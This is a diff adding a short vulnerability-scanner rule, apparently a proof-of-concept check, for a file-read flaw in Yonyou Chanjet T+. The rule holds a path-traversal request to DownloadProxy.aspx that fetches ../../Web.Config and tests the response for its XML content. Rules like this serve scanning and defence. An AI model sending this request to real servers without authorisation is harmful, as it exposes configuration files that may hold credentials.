@@ -1,0 +1,8 @@
+name: yongyou-chanjet-tplus-read-file
+rules:
+  - method: GET
+    path: "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'<?xml') && response.body.bcontains(b'<configuration>')
+detail:
+  author: 666
